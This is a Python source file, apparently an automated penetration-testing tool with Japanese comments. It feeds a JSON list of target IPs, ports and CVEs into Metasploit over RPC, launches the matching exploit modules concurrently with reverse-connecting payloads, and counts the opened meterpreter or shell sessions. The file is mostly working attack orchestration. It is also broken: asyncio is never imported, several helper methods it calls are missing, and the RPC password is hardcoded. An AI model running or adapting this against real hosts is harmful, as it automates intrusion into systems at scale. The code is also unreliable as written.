import json
import sys
import time
from typing import Dict, List, Optional, Tuple
from pymetasploit3.msfrpc import MsfRpcClient
import logging
import socket
import netifaces
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum
import queue
import traceback
from datetime import datetime

# カスタム例外クラス
class PentestAutomationError(Exception):
    """Base exception for pentest automation"""
    pass

class ConnectionError(PentestAutomationError):
    """Connection related errors"""
    pass

class PayloadError(PentestAutomationError):
    """Payload related errors"""
    pass

class ExploitError(PentestAutomationError):
    """Exploit execution related errors"""
    pass

class ValidationError(PentestAutomationError):
    """Data validation related errors"""
    pass

# 実行状態を表すEnum
class ExploitStatus(Enum):
    SUCCESS = "success"
    FAILURE = "failure"
    TIMEOUT = "timeout"
    ERROR = "error"

# 実行結果を格納するデータクラス
@dataclass
class ExploitResult:
    target_ip: str
    target_port: int
    cve: str
    module_path: str
    status: ExploitStatus
    message: str
    timestamp: datetime
    execution_time: float

class PentestAutomation:
    def __init__(self, result_file: str, lhost: Optional[str] = None, 
                 lport: int = 4444, max_workers: int = 5,
                 default_timeout: int = 30):
        """
        Enhanced initialization with thread pool and timeout settings
        """
        self.result_file = result_file
        self.max_workers = max_workers
        self.default_timeout = default_timeout
        self.results_queue = queue.Queue()
        
        # Set up enhanced logging
        self._setup_logging()
        
        try:
            self.lhost = lhost or self._get_local_ip()
            self.lport = lport
            self.results = self._load_results()
            self.client = MsfRpcClient('your_password')
            
            self.logger.info(f"""Initialization completed:
                - Local host: {self.lhost}
                - Local port: {self.lport}
                - Max workers: {max_workers}
                - Default timeout: {default_timeout}s
                - Total targets: {len(self.results)}
            """)
            
        except Exception as e:
            self.logger.critical(f"Critical error during initialization: {str(e)}")
            self.logger.debug(f"Detailed traceback: {traceback.format_exc()}")
            raise ConnectionError(f"Failed to initialize: {str(e)}")

    def _setup_logging(self):
        """Enhanced logging setup with both file and console handlers"""
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        
        # Create formatters
        file_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(threadName)s - %(message)s'
        )
        console_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        
        # File handler (detailed logging)
        file_handler = logging.FileHandler(
            f'pentest_automation_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        )
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(file_formatter)
        
        # Console handler (info level)
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(console_formatter)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    async def run_exploit_with_timeout(self, target_ip: str, target_port: int, 
                                     module_path: str, options: Dict,
                                     platform: str = "windows",
                                     timeout: Optional[int] = None) -> ExploitResult:
        """
        Enhanced exploit execution with timeout and detailed result tracking
        """
        start_time = time.time()
        timeout = timeout or self.default_timeout
        
        try:
            self.logger.info(f"Starting exploit execution for {target_ip}:{target_port}")
            
            # Create new console with timeout
            console = self.client.consoles.console()
            module = self.client.modules.use('exploit', module_path)
            
            # Get and validate payload
            payload_path = await self.get_suitable_payload(module_path, platform)
            if not payload_path:
                raise PayloadError(f"No suitable payload found for {platform}")
            
            self.logger.debug(f"Selected payload: {payload_path}")
            
            # Configure exploit
            module['RHOSTS'] = target_ip
            module['RPORT'] = target_port
            module['PAYLOAD'] = payload_path
            module['LHOST'] = self.lhost
            module['LPORT'] = self.lport
            
            # Set additional options
            for opt, value in options.items():
                if opt not in ['RHOSTS', 'RPORT', 'PAYLOAD', 'LHOST', 'LPORT']:
                    module[opt] = value
            
            # Execute with timeout
            result = await asyncio.wait_for(
                self._execute_exploit(module, console),
                timeout=timeout
            )
            
            execution_time = time.time() - start_time
            
            if result:
                status = ExploitStatus.SUCCESS
                message = "Exploit completed successfully"
            else:
                status = ExploitStatus.FAILURE
                message = "Exploit failed to achieve expected result"
            
        except asyncio.TimeoutError:
            status = ExploitStatus.TIMEOUT
            message = f"Exploit execution timed out after {timeout} seconds"
            execution_time = timeout
            
        except Exception as e:
            status = ExploitStatus.ERROR
            message = f"Error during exploit execution: {str(e)}"
            execution_time = time.time() - start_time
            self.logger.error(f"Detailed error: {traceback.format_exc()}")
            
        finally:
            if 'console' in locals():
                console.destroy()
        
        # Create and return result object
        result = ExploitResult(
            target_ip=target_ip,
            target_port=target_port,
            cve=options.get('cve', 'Unknown'),
            module_path=module_path,
            status=status,
            message=message,
            timestamp=datetime.now(),
            execution_time=execution_time
        )
        
        self.results_queue.put(result)
        return result

    async def _execute_exploit(self, module, console) -> bool:
        """Separated exploit execution logic for better error handling"""
        try:
            sessions_before = len(self.client.sessions.list)
            
            # Execute exploit
            exploit_result = module.execute()
            
            # Initial wait for session
            await asyncio.sleep(5)
            
            # Check for new session
            if len(self.client.sessions.list) > sessions_before:
                self.logger.info("Session established successfully")
                return True
            
            # Check console output
            output = console.read()
            success_indicators = [
                'session opened',
                'success',
                'meterpreter session',
                'command shell session'
            ]
            
            return any(indicator in output.lower() for indicator in success_indicators)
            
        except Exception as e:
            self.logger.error(f"Error during exploit execution: {str(e)}")
            raise ExploitError(f"Exploit execution failed: {str(e)}")

    async def process_target(self, result: Dict) -> ExploitResult:
        """Process individual target with enhanced error handling"""
        try:
            self.logger.info(f"Processing target: {result['ip']}:{result['port']}")
            
            # Validate target data
            if not self._validate_target_data(result):
                raise ValidationError(f"Invalid target data: {result}")
            
            # Determine target platform
            platform = self._detect_platform(result['service'])
            self.logger.debug(f"Detected platform: {platform}")
            
            # Search for exploit
            module_path = await self.search_exploit(result['cve'])
            if not module_path:
                raise ExploitError(f"No suitable exploit found for {result['cve']}")
            
            # Get exploit options
            options = await self.get_module_options(module_path)
            
            # Execute exploit
            return await self.run_exploit_with_timeout(
                result['ip'],
                result['port'],
                module_path,
                options,
                platform
            )
            
        except Exception as e:
            self.logger.error(f"Error processing target: {str(e)}")
            self.logger.debug(f"Detailed error: {traceback.format_exc()}")
            
            return ExploitResult(
                target_ip=result.get('ip', 'Unknown'),
                target_port=result.get('port', 0),
                cve=result.get('cve', 'Unknown'),
                module_path='',
                status=ExploitStatus.ERROR,
                message=str(e),
                timestamp=datetime.now(),
                execution_time=0
            )

    async def process_results(self):
        """Enhanced multi-threaded results processing"""
        self.logger.info(f"Starting processing of {len(self.results)} targets")
        
        tasks = []
        async with asyncio.Semaphore(self.max_workers):
            for result in self.results:
                task = asyncio.create_task(self.process_target(result))
                tasks.append(task)
            
            completed_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process and summarize results
        self._summarize_results(completed_results)

    def _summarize_results(self, results: List[ExploitResult]):
        """Summarize execution results"""
        summary = {status: 0 for status in ExploitStatus}
        total_time = 0
        
        for result in results:
            summary[result.status] += 1
            total_time += result.execution_time
        
        self.logger.info(f"""
        Execution Summary:
        -----------------
        Total targets: {len(results)}
        Successful exploits: {summary[ExploitStatus.SUCCESS]}
        Failed exploits: {summary[ExploitStatus.FAILURE]}
        Timeouts: {summary[ExploitStatus.TIMEOUT]}
        Errors: {summary[ExploitStatus.ERROR]}
        Total execution time: {total_time:.2f} seconds
        Average time per target: {total_time/len(results):.2f} seconds
        """)

async def main():
    if len(sys.argv) not in [2, 3, 4]:
        print("""
        Usage: python pentest_automation.py <results_file.json> [lhost] [lport]
        Optional arguments:
        --max-workers <int>: Maximum number of concurrent workers (default: 5)
        --timeout <int>: Default timeout in seconds (default: 30)
        """)
        sys.exit(1)
    
    try:
        result_file = sys.argv[1]
        lhost = sys.argv[2] if len(sys.argv) > 2 else None
        lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
        
        automation = PentestAutomation(result_file, lhost, lport)
        await automation.process_results()
        
    except Exception as e:
        logging.error(f"Critical error in main: {str(e)}")
        logging.debug(f"Detailed traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())